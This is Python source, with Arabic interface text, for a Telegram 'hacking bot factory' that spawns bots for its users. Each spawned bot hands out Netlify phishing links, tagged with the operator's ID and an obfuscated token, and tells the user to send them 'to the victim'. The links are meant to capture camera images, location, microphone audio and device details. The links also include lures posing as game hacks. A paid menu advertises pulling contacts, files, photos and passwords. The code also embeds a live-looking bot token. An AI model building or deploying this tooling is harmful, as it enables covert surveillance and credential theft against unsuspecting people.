import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import threading
import os
import datetime
import re
import json

# ==============================================================================
# ⬇️⬇️⬇️ **-- إعدادات المصنع الأساسية (تعديل إلزامي) --** ⬇️⬇️⬇️
# ==============================================================================
FACTORY_TOKEN = "7974888432:AAHfx-I8vN2J8sZcJrM03Lfp8t-v2HmF9N4"
FACTORY_ADMIN_ID = 7598229780
# ==============================================================================

# --- إعدادات ملفات المصنع ---
BOTS_DATA_DIR = "bots_data"
PAID_BOTS_DIR = "paid_bots_factory"
BOTS_REGISTRY_FILE = "bots_registry.json"

factory_bot = telebot.TeleBot(FACTORY_TOKEN, parse_mode="HTML")

# --- إنشاء المجلدات والملفات الأساسية ---
if not os.path.exists(BOTS_DATA_DIR): os.makedirs(BOTS_DATA_DIR)
if not os.path.exists(PAID_BOTS_DIR): os.makedirs(PAID_BOTS_DIR)
if not os.path.exists(BOTS_REGISTRY_FILE):
    with open(BOTS_REGISTRY_FILE, 'w') as f: json.dump({}, f)

# --- دوال مساعدة لإدارة المصنع ---
def get_all_bots():
    try:
        with open(BOTS_REGISTRY_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def register_bot(token, owner_id):
    bots = get_all_bots()
    bots[token] = {'owner_id': owner_id}
    with open(BOTS_REGISTRY_FILE, 'w') as f:
        json.dump(bots, f, indent=4)

def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

# --- معالجات رسائل المصنع ---
@factory_bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    channel_username = "@IRX_J"
    try:
        member = factory_bot.get_chat_member(channel_username, user_id)
        if member.status not in ['member', 'administrator', 'creator']:
            join_link = f"https://t.me/{channel_username.lstrip('@')}"
            btn = InlineKeyboardMarkup()
            btn.add(InlineKeyboardButton("📢 قناة التحديثات", url=join_link))
            btn.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_sub"))
            factory_bot.send_message(message.chat.id, "🚫 <b>يجب عليك الاشتراك بقناة التحديثات أولاً.</b>", reply_markup=btn)
            return
    except Exception:
        factory_bot.send_message(message.chat.id, "❌ حدث خطأ أثناء التحقق من الاشتراك. تأكد أن البوت أدمن في القناة.")
        return
    
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🤖 صنع بوت اختراق", callback_data="make_bot"))
    factory_bot.send_message(message.chat.id, """<b>حياك الله في بوت صانع بوتات اختراق</b>

المطور: @lTF_l
قناة المطور: @IRX_J""", reply_markup=kb)

@factory_bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def recheck_subscription(call):
    user_id = call.from_user.id
    channel_username = "@IRX_J"
    try:
        member = factory_bot.get_chat_member(channel_username, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🤖 صنع بوت اختراق", callback_data="make_bot"))
            factory_bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="""<b>حياك الله في بوت صانع بوتات اختراق</b>

المطور: @lTF_l
قناة المطور: @IRX_J""", reply_markup=kb)
        else:
            factory_bot.answer_callback_query(call.id, "❌ لم يتم التأكد من الاشتراك بعد. حاول مرة أخرى.", show_alert=True)
    except Exception as e:
        factory_bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)

@factory_bot.callback_query_handler(func=lambda call: call.data == "make_bot")
def ask_token(call):
    factory_bot.send_message(call.message.chat.id, "📝 <b>أرسل الآن توكن البوت الذي أنشأته من BotFather.</b>")
    factory_bot.register_next_step_handler(call.message, lambda msg: handle_token(msg, call.from_user.id))

def handle_token(message, admin_id):
    user_token = message.text.strip()
    try:
        info = requests.get(f"https://api.telegram.org/bot{user_token}/getMe").json()
        if not info["ok"]:
            factory_bot.send_message(message.chat.id, "❌ <b>التوكن غير صالح.</b>\nيرجى التأكد من نسخ التوكن بشكل صحيح من BotFather والمحاولة مرة أخرى.")
            return
        
        if user_token in get_all_bots():
            factory_bot.send_message(message.chat.id, "❌ <b>هذا البوت تم إنشاؤه بالفعل من خلال المصنع.</b>")
            return

        factory_bot.send_message(message.chat.id, "⏳ جاري إعداد البوت، يرجى الانتظار...")
        
        bot_data_dir = os.path.join(BOTS_DATA_DIR, user_token.replace(":", "_"))
        if not os.path.exists(bot_data_dir):
            os.makedirs(bot_data_dir)

        register_bot(user_token, admin_id)

        threading.Thread(target=run_new_bot, args=(user_token, admin_id, bot_data_dir), daemon=True).start()

        bot_name = info['result']['first_name']
        bot_username = info['result']['username']
        bot_id = info['result']['id']
        
        factory_bot.send_message(
            FACTORY_ADMIN_ID,
            f"✅ <b>تم إنشاء بوت جديد:</b>\n\n"
            f"<b>🤖 الاسم:</b> {bot_name}\n"
            f"<b>📟 اليوزر:</b> @{bot_username}\n"
            f"<b>🆔 ID:</b> <code>{bot_id}</code>"
        )
        factory_bot.send_message(message.chat.id, "✅ <b>تم تشغيل البوت بنجاح.</b>\n\nاذهب الآن إلى بوتك وأرسل له الأمر /start.\nللوصول للوحة التحكم، استخدم الأمر /admin في بوتك الخاص.")
    except Exception as e:
        print(f"Error in handle_token: {e}")
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ غير متوقع أثناء إنشاء البوت.\nالخطأ: {e}")

# ==============================================================================
# --- بداية منطق البوت المصنوع ---
# ==============================================================================
def run_new_bot(token, owner_id, data_dir):
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # --- إعدادات ملفات البوت المصنوع ---
    subscribers_file = os.path.join(data_dir, "users.txt")
    admins_file = os.path.join(data_dir, "admins.txt")
    channels_file = os.path.join(data_dir, "channels.txt")
    banned_file = os.path.join(data_dir, "banned.txt")
    status_file = os.path.join(data_dir, "status.txt")
    notify_file = os.path.join(data_dir, "notify.txt")
    state_file = os.path.join(data_dir, "state.txt")
    paid_mode_file = os.path.join(data_dir, "paid_mode.txt")
    paid_users_file = os.path.join(data_dir, "paid_users.txt")
    start_message_file = os.path.join(data_dir, "start_message.txt")
    points_file = os.path.join(data_dir, "points.json") # ملف النقاط
    invited_by_file = os.path.join(data_dir, "invited_by.json") # ملف لتتبع الدعوات

    # --- دوال مساعدة لإدارة ملفات البوت المصنوع ---
    def get_json_data(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    def save_json_data(file_path, data):
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

    def get_user_points(user_id):
        points_data = get_json_data(points_file)
        return points_data.get(str(user_id), 0)

    def add_user_points(user_id, amount):
        points_data = get_json_data(points_file)
        current_points = points_data.get(str(user_id), 0)
        points_data[str(user_id)] = current_points + amount
        save_json_data(points_file, points_data)

    def get_lines(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            return []

    def add_line(file_path, line):
        current_lines = get_lines(file_path)
        if str(line) not in current_lines:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{line}\n")

    def remove_line(file_path, line_to_remove):
        lines = get_lines(file_path)
        with open(file_path, 'w', encoding='utf-8') as f:
            for line in lines:
                if line != str(line_to_remove):
                    f.write(f"{line}\n")

    def get_setting(file_path, default):
        try:
            with open(file_path, 'r', encoding='utf-8') as f: return f.read().strip()
        except FileNotFoundError:
            return default

    def set_setting(file_path, value):
        with open(file_path, 'w', encoding='utf-8') as f: f.write(str(value))

    def get_state(): return get_setting(state_file, None)
    def set_state(state):
        if state is None:
            if os.path.exists(state_file): os.remove(state_file)
        else:
            set_setting(state_file, state)

    # --- إعدادات أولية للبوت المصنوع ---
    if not os.path.exists(status_file): set_setting(status_file, "ON")
    if not os.path.exists(notify_file): set_setting(notify_file, "ON")
    if not os.path.exists(admins_file): add_line(admins_file, owner_id)
    if not os.path.exists(paid_mode_file): set_setting(paid_mode_file, "OFF")
    if not os.path.exists(points_file): save_json_data(points_file, {})
    if not os.path.exists(invited_by_file): save_json_data(invited_by_file, {})

    # --- دوال التحقق من الحالة ---
    def is_admin(user_id): return str(user_id) in get_lines(admins_file)
    def is_paid_user(user_id): return str(user_id) in get_lines(paid_users_file)
    def is_paid_mode(): return get_setting(paid_mode_file, "OFF") == "ON"
    def is_bot_enabled(): return get_setting(status_file, "ON") == "ON"
    def is_notify_enabled(): return get_setting(notify_file, "ON") == "ON"
    def is_user_banned(user_id): return str(user_id) in get_lines(banned_file)

    def is_user_subscribed(user_id):
        channels = get_lines(channels_file)
        if not channels: return True
        for ch in channels:
            try:
                member = bot.get_chat_member(f"@{ch}", user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    return False
            except Exception:
                return False
        return True

    def is_bot_paid_to_factory():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file):
            return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError):
            return False

    @bot.message_handler(commands=['start'])
    def start_new(message):
        user_id = str(message.from_user.id)
        
        # --- منطق الدعوات ---
        try:
            inviter_id = message.text.split()[1]
            invited_users = get_json_data(invited_by_file)
            if user_id not in invited_users and user_id != inviter_id:
                invited_users[user_id] = inviter_id
                save_json_data(invited_by_file, invited_users)
                add_user_points(inviter_id, 1)
                try:
                    bot.send_message(inviter_id, f"🎉 لقد انضم مستخدم جديد عبر رابطك! حصلت على 1 نقطة.\nرصيدك الحالي: {get_user_points(inviter_id)} نقطة.")
                except:
                    pass
        except (IndexError, ValueError):
            pass # لا يوجد كود دعوة

        if not is_bot_enabled() and not is_admin(user_id):
            bot.send_message(message.chat.id, "🚨 <b>البوت متوقف حاليًا للصيانة.</b>")
            return

        if is_user_banned(user_id):
            bot.send_message(message.chat.id, "🚫 <b>أنت محظور من استخدام هذا البوت.</b>")
            return

        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id):
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("👤 التواصل مع المطور", url=f"tg://user?id={owner_id}"))
            bot.send_message(
                message.chat.id,
                """مرحبًا بكم! 🌟

للاستفادة الكاملة من جميع ميزات وخدمات بوتنا المتقدمة، يُرجى تفعيل البوت من خلال شراء الاشتراك. ⚙️✨

نحن نعمل بجد لضمان تقديم تجربة فريدة ومميزة لكم. 🚀

شكراً لثقتكم بنا. 😊""",
                reply_markup=kb
            )
            return

        channels = get_lines(channels_file)
        not_subscribed_channels = []
        for ch in channels:
            try:
                member = bot.get_chat_member(f"@{ch}", user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    not_subscribed_channels.append(ch)
            except Exception:
                not_subscribed_channels.append(ch)

        if not_subscribed_channels:
            kb = InlineKeyboardMarkup()
            for ch in not_subscribed_channels:
                kb.add(InlineKeyboardButton(f"📢 اشترك في @{ch}", url=f"https://t.me/{ch}"))
            kb.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_force_sub"))
            bot.send_message(message.chat.id, "🚫 <b>يجب الاشتراك في القنوات التالية للمتابعة:</b>", reply_markup=kb)
            return

        if user_id not in get_lines(subscribers_file):
            add_line(subscribers_file, user_id)
            if is_notify_enabled():
                try:
                    total_users = len(get_lines(subscribers_file))
                    for admin_id in get_lines(admins_file):
                        bot.send_message(admin_id, 
                            f"🔔 <b>مستخدم جديد انضم إلى البوت!</b>\n\n"
                            f"<b>👨‍💼 اسمه:</b> {message.from_user.first_name}\n"
                            f"<b>🔱 معرفه:</b> @{message.from_user.username or 'N/A'}\n"
                            f"<b>💳 آيديه:</b> <code>{user_id}</code>\n"
                            f"<b>📊 عدد الأعضاء الكلي:</b> {total_users}"
                        )
                except Exception:
                    pass
        
        start_message_text = get_setting(start_message_file, '🤖✨ <b>مرحبًا بك، جميع الأزرار مجانية</b> 😊')
        
        if not is_bot_paid_to_factory():
            factory_rights = '\n<a href="https://t.me/IRXJ_bot">لصنع بوت اختراق اضغط هنا</a>'
            if factory_rights not in start_message_text:
                 start_message_text += factory_rights

        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("📷 الكاميرا الخلفية", callback_data="cam_back"),
            InlineKeyboardButton("🔥 الكاميرا الأمامية", callback_data="cam_front")
        )
        kb.row(
            InlineKeyboardButton("📌 اختراق الموقع", callback_data="location"),
            InlineKeyboardButton("🎤 تسجيل صوتي", callback_data="mic_record")
        )
        kb.add(InlineKeyboardButton("📵 اختراق الجهاز بالكامل 📵", callback_data="full_hack_info"))
        kb.row(
            InlineKeyboardButton("‼ اختراق ببجي ‼", callback_data="pubg_hack"),
            InlineKeyboardButton("💎 اختراق فري فاير 💎", callback_data="ff_hack")
        )
        kb.add(InlineKeyboardButton("📃 معلومات الجهاز", callback_data="device_info"))
        
        bot.send_message(message.chat.id, start_message_text, reply_markup=kb, disable_web_page_preview=True)
    @bot.callback_query_handler(func=lambda call: call.data == "check_force_sub")
    def handle_check_force_sub(call):
        channels = get_lines(channels_file)
        is_subscribed = True
        for ch in channels:
            try:
                member = bot.get_chat_member(f"@{ch}", call.from_user.id)
                if member.status not in ['member', 'administrator', 'creator']:
                    is_subscribed = False
                    break
            except Exception:
                is_subscribed = False
                break
        
        if is_subscribed:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            from telebot.types import User, Chat
            user = User(call.from_user.id, call.from_user.first_name, call.from_user.username)
            chat = Chat(call.message.chat.id, 'private')
            reconstructed_message = telebot.types.Message(
                message_id=call.message.message_id,
                from_user=user,
                date=None,
                chat=chat,
                content_type='text',
                options={'text': '/start'},
                json_string=""
            )
            start_new(reconstructed_message)
        else:
            bot.answer_callback_query(call.id, "❌ لم تشترك في جميع القنوات بعد.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "full_hack_info")
    def handle_full_hack_info(call):
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "<b>لفتح أوامر اختراق الهاتف كاملاً، قم بإرسال الأمر التالي:\n/vip</b>")

    @bot.message_handler(commands=['vip'])
    def show_vip_panel(message):
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("👤 سحب جهات الاتصال", callback_data="vip_contacts"),
            InlineKeyboardButton("📁 سحب الملفات", callback_data="vip_files")
        )
        kb.row(
            InlineKeyboardButton("🖼️ سحب الصور", callback_data="vip_gallery"),
            InlineKeyboardButton("🔑 سحب كلمات السر", callback_data="vip_passwords")
        )
        vip_text = """مرحبًا!
هذه الخيارات مدفوعة بسعر <b>15 نقطة</b> لكل عملية.
يمكنك تجميع النقاط وفتحها مجانًا.

🔹 ارسل /ng_wahm لعرض عدد نقاطك ورابط الدعوة الخاص بك."""
        bot.send_message(message.chat.id, vip_text, reply_markup=kb)

    @bot.message_handler(commands=['ng_wahm'])
    def show_points_and_invite_link(message):
        user_id = str(message.from_user.id)
        points = get_user_points(user_id)
        bot_username = bot.get_me().username
        invite_link = f"https://t.me/{bot_username}?start={user_id}"
        
        points_text = f"""💰 <b>رصيد نقاطك: {points} نقطة</b>

🚀 <b>اجمع نقاط بدعوة أصدقائك عبر رابطك الخاص:</b>
<code>{invite_link}</code>
"""
        bot.send_message(message.chat.id, points_text)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("vip_"))
    def handle_vip_callbacks(call):
        user_id = str(call.from_user.id)
        points = get_user_points(user_id)
        cost = 15

        if points >= cost:
            # خصم النقاط وتنفيذ الأمر (هنا نضع رسالة مؤقتة)
            add_user_points(user_id, -cost)
            feature_name = call.message.json['reply_markup']['inline_keyboard'][0][0]['text'] # طريقة للحصول على اسم الزر
            bot.answer_callback_query(call.id, f"✅ تم خصم {cost} نقطة. جاري تنفيذ '{feature_name}'...", show_alert=True)
            # هنا يمكنك إضافة الكود الفعلي لتنفيذ الميزة
            bot.send_message(call.message.chat.id, f"تم تنفيذ ميزة '{feature_name}' بنجاح.")
        else:
            bot.answer_callback_query(call.id, f"🚫 رصيدك غير كافٍ. تحتاج إلى {cost} نقطة على الأقل.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data in ["cam_back", "cam_front", "location", "mic_record", "device_info", "pubg_hack", "ff_hack"])
    def send_link(call):
        user_id = call.from_user.id
        if not is_bot_enabled() and not is_admin(user_id):
            bot.answer_callback_query(call.id, "🚫 لا يمكنك استخدام البوت حاليًا.", show_alert=True)
            return
        
        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id):
            bot.answer_callback_query(call.id, "🚫 هذه الميزة تتطلب اشتراكًا مدفوعًا.", show_alert=True)
            return

        encrypted_token = encrypt_token(token)
        links = {
            "cam_back": "https://spectacular-crumble-77f830.netlify.app",
            "cam_front": "https://profound-bubblegum-7f29b2.netlify.app",
            "location": "https://illustrious-panda-c2ece1.netlify.app",
            "mic_record": "https://tourmaline-kulfi-aeb7ea.netlify.app",
            "device_info": "http://incredible-fairy-85f241.netlify.app",
            "pubg_hack": "https://sunny-concha-96fe88.netlify.app",
            "ff_hack": "https://thunderous-maamoul-7653c0.netlify.app"
        }
        
        if call.data in links:
            link = f"{links[call.data]}/?id={user_id}&tok={encrypted_token}"
            bot.answer_callback_query(call.id, "✅ تم توليد الرابط بنجاح")
            bot.send_message(call.message.chat.id, f"<b>انسخ الرابط التالي وأرسله للضحية:</b>\n<code>{link}</code>")

    def get_admin_panel():
        kb = InlineKeyboardMarkup(row_width=2)
        total_users = len(get_lines(subscribers_file))
        
        kb.add(InlineKeyboardButton(f"👥 المشتركين ({total_users})", callback_data="m1"))
        kb.row(
            InlineKeyboardButton("📮 إذاعة رسالة", callback_data="send"),
            InlineKeyboardButton("🔄 توجيه رسالة", callback_data="forward")
        )
        kb.row(
            InlineKeyboardButton("💢 إضافة قناة", callback_data="add_ch"),
            InlineKeyboardButton("🔱 حذف قناة", callback_data="del_ch")
        )
        kb.row(
            InlineKeyboardButton("✔️ تفعيل التنبيه", callback_data="ons"),
            InlineKeyboardButton("❎ تعطيل التنبيه", callback_data="ofs")
        )
        kb.row(
            InlineKeyboardButton("✅ فتح البوت", callback_data="obot"),
            InlineKeyboardButton("❌ إيقاف البوت", callback_data="ofbot")
        )
        kb.row(
            InlineKeyboardButton("🚫 حظر عضو", callback_data="ban"),
            InlineKeyboardButton("🔓 إلغاء حظر", callback_data="unban")
        )
        kb.row(
            InlineKeyboardButton("➕ إضافة أدمن", callback_data="add_admin"),
            InlineKeyboardButton("➖ طرد أدمن", callback_data="rem_admin")
        )
        kb.row(
            InlineKeyboardButton("💰 الوضع المدفوع", callback_data="set_paid"),
            InlineKeyboardButton("🆓 الوضع المجاني", callback_data="set_free")
        )
        kb.row(
            InlineKeyboardButton("⭐ إضافة عضوية مدفوعة", callback_data="add_paid"),
            InlineKeyboardButton("🗑️ حذف عضوية مدفوعة", callback_data="rem_paid")
        )
        kb.add(InlineKeyboardButton("✏️ تعديل رسالة /start", callback_data="set_start_msg"))
        return kb

    @bot.message_handler(commands=['admin'])
    def admin_panel(message):
        if not is_admin(message.from_user.id): return
        set_state(None)
        kb = get_admin_panel()
        admin_panel_text = """مرحبًا! إليك أوامرك: ⚡📮

1. إدارة المشتركين والتحكم بهم.
2. إرسال إذاعات ورسائل موجهة.
3. ضبط إعدادات الاشتراك الإجباري.
4. تفعيل أو تعطيل التنبيهات.
5. إدارة حالة البوت ووضع الاشتراك.
6. الوصول لتحديثات البوت بسهولة."""
        bot.send_message(message.chat.id, admin_panel_text, reply_markup=kb)

    @bot.callback_query_handler(func=lambda call: is_admin(call.from_user.id))
    def handle_admin_callbacks(call):
        action = call.data
        
        actions_requiring_input = {
            "send": "حسناً، أرسل رسالتك ليتم بثها لجميع المشتركين 📮",
            "forward": "حسناً، قم بتوجيه الرسالة لي الآن 🔄",
            "add_ch": "أرسل معرف القناة بدون @ (مثال: <code>IRX_J</code>)",
            "del_ch": "أرسل معرف القناة التي تريد حذفها 🔱",
            "ban": "أرسل آي دي العضو الذي تريد حظره 🚫",
            "unban": "أرسل آي دي العضو لإلغاء حظره 🔓",
            "add_admin": "أرسل آي دي المستخدم الذي تريد ترقيته إلى أدمن ➕",
            "rem_admin": "أرسل آي دي الأدمن الذي تريد عزله ➖",
            "add_paid": "أرسل آي دي العضو لإضافته للعضوية المدفوعة ⭐",
            "rem_paid": "أرسل آي دي العضو لحذفه من العضوية المدفوعة 🗑️",
            "set_start_msg": "أرسل الآن رسالة الترحيب الجديدة التي ستظهر عند إرسال /start."
        }

        if action in actions_requiring_input:
            set_state(action)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"<b>{actions_requiring_input[action]}</b>",
                reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 إلغاء", callback_data="back"))
            )
        elif action == "back":
            set_state(None)
            admin_panel_text = """مرحبًا! إليك أوامرك: ⚡📮

1. إدارة المشتركين والتحكم بهم.
2. إرسال إذاعات ورسائل موجهة.
3. ضبط إعدادات الاشتراك الإجباري.
4. تفعيل أو تعطيل التنبيهات.
5. إدارة حالة البوت ووضع الاشتراك.
6. الوصول لتحديثات البوت بسهولة."""
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=admin_panel_text,
                reply_markup=get_admin_panel()
            )
        elif action == "m1":
            count = len(get_lines(subscribers_file))
            bot.answer_callback_query(call.id, f"عدد المشتركين الكلي: {count}", show_alert=True)
        elif action == "ons":
            set_setting(notify_file, "ON"); bot.answer_callback_query(call.id, "✔️ تم تفعيل تنبيه دخول الأعضاء.")
        elif action == "ofs":
            set_setting(notify_file, "OFF"); bot.answer_callback_query(call.id, "❎ تم تعطيل تنبيه دخول الأعضاء.")
        elif action == "obot":
            set_setting(status_file, "ON"); bot.answer_callback_query(call.id, "✅ تم فتح البوت للجميع.")
        elif action == "ofbot":
            set_setting(status_file, "OFF"); bot.answer_callback_query(call.id, "❌ تم إيقاف البوت.")
        elif action == "set_paid":
            set_setting(paid_mode_file, "ON"); bot.answer_callback_query(call.id, "💰 تم تفعيل الوضع المدفوع.")
        elif action == "set_free":
            set_setting(paid_mode_file, "OFF"); bot.answer_callback_query(call.id, "🆓 تم تفعيل الوضع المجاني.")

    @bot.message_handler(func=lambda message: is_admin(message.from_user.id) and get_state() is not None, content_types=['text', 'photo', 'video', 'document', 'sticker', 'voice', 'audio'])
    def handle_admin_state_messages(message):
        state = get_state()
        text = message.text
        current_admin_id = str(message.from_user.id)
        
        def broadcast(action_func):
            users = get_lines(subscribers_file)
            count = 0
            bot.send_message(current_admin_id, f"⏳ <b>بدء الإذاعة لـ {len(users)} مشترك...</b>")
            for user_id in users:
                try:
                    action_func(user_id)
                    count += 1
                except Exception:
                    pass
            bot.send_message(current_admin_id, f"✅ <b>تم الإجراء بنجاح لـ {count} مشترك.</b>")

        if state == "send":
            broadcast(lambda user_id: bot.copy_message(user_id, current_admin_id, message.message_id))
        elif state == "forward":
            broadcast(lambda user_id: bot.forward_message(user_id, current_admin_id, message.message_id))
        elif state == "add_ch":
            channel = text.strip().replace('@', '')
            add_line(channels_file, channel)
            bot.send_message(current_admin_id, f"✅ تم إضافة القناة <code>{channel}</code> للاشتراك الإجباري.")
        elif state == "del_ch":
            channel = text.strip().replace('@', '')
            remove_line(channels_file, channel)
            bot.send_message(current_admin_id, f"🔱 تم حذف القناة <code>{channel}</code>.")
        elif state == "ban":
            user_to_ban = text.strip()
            if user_to_ban.isdigit():
                add_line(banned_file, user_to_ban)
                bot.send_message(current_admin_id, f"🚫 تم حظر العضو <code>{user_to_ban}</code> بنجاح.")
                try: bot.send_message(user_to_ban, "<b>تم حظرك من قبل المطور.</b>")
                except: pass
            else:
                bot.send_message(current_admin_id, "❌ <b>خطأ:</b> يرجى إرسال آي دي رقمي صحيح.")
        elif state == "unban":
            user_to_unban = text.strip()
            if user_to_unban.isdigit():
                remove_line(banned_file, user_to_unban)
                bot.send_message(current_admin_id, f"🔓 تم إلغاء حظر العضو <code>{user_to_unban}</code>.")
                try: bot.send_message(user_to_unban, "<b>تم إلغاء حظرك.</b>")
                except: pass
            else:
                bot.send_message(current_admin_id, "❌ <b>خطأ:</b> يرجى إرسال آي دي رقمي صحيح.")
        elif state == "add_admin":
            new_admin_id = text.strip()
            if not new_admin_id.isdigit():
                bot.send_message(current_admin_id, "❌ <b>خطأ:</b> الآي دي يجب أن يكون رقمًا.")
            else:
                if new_admin_id in get_lines(subscribers_file):
                    add_line(admins_file, new_admin_id)
                    bot.send_message(current_admin_id, f"✅ تم ترقية المستخدم <code>{new_admin_id}</code> إلى رتبة أدمن بنجاح.")
                    try:
                        bot.send_message(new_admin_id, "🎉 <b>تهانينا! لقد تم ترقيتك إلى رتبة أدمن في البوت.</b>\nيمكنك الآن استخدام الأمر /admin.")
                    except: pass
                else:
                    bot.send_message(current_admin_id, "⚠️ <b>عذرًا، لا يمكن ترقية هذا المستخدم.</b>\nيجب على المستخدم أن يكون قد قام بتشغيل البوت (أرسل /start) على الأقل مرة واحدة.")
        elif state == "rem_admin":
            admin_to_remove = text.strip()
            if not admin_to_remove.isdigit():
                bot.send_message(current_admin_id, "❌ <b>خطأ:</b> الآي دي يجب أن يكون رقمًا.")
            elif admin_to_remove == str(owner_id):
                bot.send_message(current_admin_id, "❌ <b>لا يمكن عزل المالك الأساسي للبوت.</b>")
            elif admin_to_remove == current_admin_id:
                bot.send_message(current_admin_id, "❌ <b>لا يمكنك عزل نفسك.</b>")
            elif admin_to_remove not in get_lines(admins_file):
                bot.send_message(current_admin_id, "❌ <b>هذا المستخدم ليس أدمنًا بالفعل.</b>")
            else:
                remove_line(admins_file, admin_to_remove)
                bot.send_message(current_admin_id, f"✅ تم عزل المستخدم <code>{admin_to_remove}</code> من قائمة الأدمنية بنجاح.")
                try:
                    bot.send_message(admin_to_remove, "⚠️ <b>لقد تم عزلك من رتبة الأدمن في البوت.</b>")
                except: pass
        elif state == "add_paid":
            user_to_add = text.strip()
            if not user_to_add.isdigit():
                bot.send_message(current_admin_id, "❌ <b>خطأ:</b> الآي دي يجب أن يكون رقمًا.")
            else:
                add_line(paid_users_file, user_to_add)
                bot.send_message(current_admin_id, f"✅ تم إضافة المستخدم <code>{user_to_add}</code> إلى قائمة العضويات المدفوعة.")
                try:
                    bot.send_message(user_to_add, "🎉 <b>تهانينا! تم تفعيل عضويتك المدفوعة. يمكنك الآن استخدام البوت بالكامل.</b>")
                except: pass
        elif state == "rem_paid":
            user_to_remove = text.strip()
            if not user_to_remove.isdigit():
                bot.send_message(current_admin_id, "❌ <b>خطأ:</b> الآي دي يجب أن يكون رقمًا.")
            elif user_to_remove not in get_lines(paid_users_file):
                bot.send_message(current_admin_id, "❌ <b>هذا المستخدم ليس لديه عضوية مدفوعة بالفعل.</b>")
            else:
                remove_line(paid_users_file, user_to_remove)
                bot.send_message(current_admin_id, f"✅ تم حذف العضوية المدفوعة للمستخدم <code>{user_to_remove}</code>.")
                try:
                    bot.send_message(user_to_remove, "⚠️ <b>لقد انتهت عضويتك المدفوعة.</b>")
                except: pass
        elif state == "set_start_msg":
            new_start_msg = message.html_text
            factory_rights_pattern = r'\n?<a href="https?://t\.me/IRXJ_bot">.*?</a>'
            cleaned_msg = re.sub(factory_rights_pattern, '', new_start_msg, flags=re.IGNORECASE).strip()
            set_setting(start_message_file, cleaned_msg)
            bot.send_message(current_admin_id, "✅ تم حفظ رسالة الترحيب الجديدة بنجاح.")
        
        set_state(None)
        admin_panel(message)

    print(f"✅ البوت @{bot.get_me().username} يعمل الآن...")
    bot.infinity_polling(skip_pending=True)

# ==============================================================================
# --- لوحة تحكم المصنع (للمطور فقط) ---
# ==============================================================================
@factory_bot.message_handler(commands=['admin'])
def factory_admin_panel(msg):
    if msg.from_user.id != FACTORY_ADMIN_ID: return
    
    kb = InlineKeyboardMarkup()
    total_bots = len(get_all_bots())
    kb.add(InlineKeyboardButton(f"📊 إحصائيات المصنع ( {total_bots} بوت )", callback_data="factory_stats"))
    kb.add(InlineKeyboardButton("➕ إضافة بوت مدفوع", callback_data="add_paid_bot"))
    factory_bot.send_message(msg.chat.id, "⚙️ <b>لوحة تحكم المصنع</b>", reply_markup=kb)

@factory_bot.callback_query_handler(func=lambda call: call.from_user.id == FACTORY_ADMIN_ID)
def factory_callbacks(call):
    if call.data == "factory_stats":
        total_bots = len(get_all_bots())
        factory_bot.answer_callback_query(call.id, f"عدد البوتات المصنوعة: {total_bots}", show_alert=True)
    elif call.data == "add_paid_bot":
        factory_bot.send_message(call.message.chat.id, "📝 أرسل توكن البوت الذي تريد تفعيله:")
        factory_bot.register_next_step_handler(call.message, process_token_for_paid)

def process_token_for_paid(msg):
    token = msg.text.strip()
    factory_bot.send_message(msg.chat.id, "📆 أرسل عدد أيام التفعيل:")
    factory_bot.register_next_step_handler(msg, lambda m: save_paid_info(m, token))

def save_paid_info(msg, token):
    try:
        days = int(msg.text.strip())
        expire_time = datetime.datetime.now() + datetime.timedelta(days=days)
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        with open(paid_file, "w") as f:
            f.write(str(expire_time.timestamp()))
        factory_bot.send_message(msg.chat.id, f"✅ تم تفعيل البوت <code>{token}</code> لمدة {days} يومًا.")
    except ValueError:
        factory_bot.send_message(msg.chat.id, "❌ عدد الأيام غير صالح. يرجى إرسال رقم.")

# ==============================================================================
# --- بدء تشغيل المصنع ---
# ==============================================================================
if __name__ == "__main__":
    print("🔄 جاري إعادة تشغيل البوتات المصنوعة...")
